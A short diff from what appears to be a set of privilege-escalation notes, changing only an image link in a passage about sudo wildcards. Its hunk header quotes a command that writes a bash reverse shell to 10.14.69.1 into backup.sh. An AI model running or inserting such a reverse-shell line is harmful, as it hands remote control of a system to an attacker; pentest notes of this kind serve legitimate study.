@@ -84,7 +84,7 @@ echo "#!/bin/bash bash -i >& /dev/tcp/10.14.69.1/999 0>&1" > backup.sh
 
 - If you see that running `sudo -l` someone is using a wildcard like:
 
-![](./img/Pasted%20image%2020240210151540.png)
+![](Pasted%20image%2020240210151540.png)
 
 - Run the following:
 
